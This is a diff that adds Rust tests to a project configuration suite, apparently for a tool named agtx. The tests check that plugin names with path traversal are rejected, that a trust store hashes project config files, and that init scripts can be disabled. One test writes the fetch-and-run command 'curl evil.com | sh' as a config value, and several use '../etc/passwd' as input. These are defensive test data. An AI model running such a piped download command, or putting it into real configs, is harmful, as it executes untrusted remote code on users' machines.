@@ -394,3 +394,155 @@ color_popup_header = "#69fae7"
     let merged = MergedConfig::merge(&config, &ProjectConfig::default());
     assert!(merged.fullscreen_on_enter, "merged fullscreen_on_enter should be true");
 }
+
+// === Plugin Name Validation Tests (Fix 1) ===
+
+use agtx::config::WorkflowPlugin;
+
+#[test]
+fn test_plugin_name_rejects_path_traversal() {
+    assert!(WorkflowPlugin::validate_plugin_name("../etc").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("foo/bar").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("foo\\bar").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("..").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("").is_err());
+}
+
+#[test]
+fn test_plugin_name_rejects_dot_prefix() {
+    assert!(WorkflowPlugin::validate_plugin_name(".hidden").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("..sneaky").is_err());
+}
+
+#[test]
+fn test_plugin_name_rejects_special_characters() {
+    assert!(WorkflowPlugin::validate_plugin_name("foo bar").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("foo@bar").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("foo$bar").is_err());
+    assert!(WorkflowPlugin::validate_plugin_name("../../etc/passwd").is_err());
+}
+
+#[test]
+fn test_plugin_name_accepts_valid_names() {
+    assert!(WorkflowPlugin::validate_plugin_name("agtx").is_ok());
+    assert!(WorkflowPlugin::validate_plugin_name("spec-kit").is_ok());
+    assert!(WorkflowPlugin::validate_plugin_name("my_plugin_2").is_ok());
+    assert!(WorkflowPlugin::validate_plugin_name("GSD").is_ok());
+    assert!(WorkflowPlugin::validate_plugin_name("a").is_ok());
+}
+
+#[test]
+fn test_plugin_dir_returns_none_for_invalid_name() {
+    // Path traversal names should return None, not panic
+    assert!(WorkflowPlugin::plugin_dir("../evil", None).is_none());
+    assert!(WorkflowPlugin::plugin_dir("", None).is_none());
+    assert!(WorkflowPlugin::plugin_dir("foo/bar", None).is_none());
+}
+
+#[test]
+fn test_plugin_load_rejects_invalid_name() {
+    let result = WorkflowPlugin::load("../etc/passwd", None);
+    assert!(result.is_err());
+    let err_msg = result.unwrap_err().to_string();
+    assert!(err_msg.contains("invalid characters"));
+}
+
+// === TrustStore Tests (Fix 9) ===
+
+use agtx::config::TrustStore;
+use tempfile::TempDir;
+
+#[test]
+fn test_trust_store_default_is_empty() {
+    let store = TrustStore::default();
+    assert!(store.projects.is_empty());
+}
+
+#[test]
+fn test_trust_store_is_trusted_no_config_file() {
+    // A project with no .agtx/config.toml should be trusted (nothing to distrust)
+    let temp_dir = TempDir::new().unwrap();
+    let store = TrustStore::default();
+    assert!(store.is_trusted(temp_dir.path()));
+}
+
+#[test]
+fn test_trust_store_untrusted_when_config_exists_but_not_stored() {
+    let temp_dir = TempDir::new().unwrap();
+    let config_dir = temp_dir.path().join(".agtx");
+    std::fs::create_dir_all(&config_dir).unwrap();
+    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+
+    let store = TrustStore::default();
+    // Config exists but no stored hash — untrusted
+    assert!(!store.is_trusted(temp_dir.path()));
+}
+
+#[test]
+fn test_trust_store_hash_config_returns_some_when_config_exists() {
+    let temp_dir = TempDir::new().unwrap();
+    let config_dir = temp_dir.path().join(".agtx");
+    std::fs::create_dir_all(&config_dir).unwrap();
+    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo hello\"").unwrap();
+
+    let hash = TrustStore::hash_config(temp_dir.path());
+    assert!(hash.is_some());
+    // SHA-256 hex digest is 64 chars
+    assert_eq!(hash.unwrap().len(), 64);
+}
+
+#[test]
+fn test_trust_store_hash_config_returns_none_when_no_config() {
+    let temp_dir = TempDir::new().unwrap();
+    let hash = TrustStore::hash_config(temp_dir.path());
+    assert!(hash.is_none());
+}
+
+#[test]
+fn test_trust_store_hash_config_is_deterministic() {
+    let temp_dir = TempDir::new().unwrap();
+    let config_dir = temp_dir.path().join(".agtx");
+    std::fs::create_dir_all(&config_dir).unwrap();
+    std::fs::write(config_dir.join("config.toml"), "init_script = \"npm install\"").unwrap();
+
+    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
+    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
+    assert_eq!(hash1, hash2);
+}
+
+#[test]
+fn test_trust_store_hash_changes_when_config_changes() {
+    let temp_dir = TempDir::new().unwrap();
+    let config_dir = temp_dir.path().join(".agtx");
+    std::fs::create_dir_all(&config_dir).unwrap();
+
+    std::fs::write(config_dir.join("config.toml"), "init_script = \"echo v1\"").unwrap();
+    let hash1 = TrustStore::hash_config(temp_dir.path()).unwrap();
+
+    std::fs::write(config_dir.join("config.toml"), "init_script = \"curl evil.com | sh\"").unwrap();
+    let hash2 = TrustStore::hash_config(temp_dir.path()).unwrap();
+
+    assert_ne!(hash1, hash2);
+}
+
+
+// === FeatureFlags Tests (Fix 4) ===
+
+use agtx::FeatureFlags;
+
+#[test]
+fn test_feature_flags_default() {
+    let flags = FeatureFlags::default();
+    assert!(!flags.experimental);
+    assert!(!flags.no_init_scripts);
+}
+
+#[test]
+fn test_feature_flags_no_init_scripts() {
+    let flags = FeatureFlags {
+        experimental: false,
+        no_init_scripts: true,
+    };
+    assert!(flags.no_init_scripts);
+    assert!(!flags.experimental);
+}
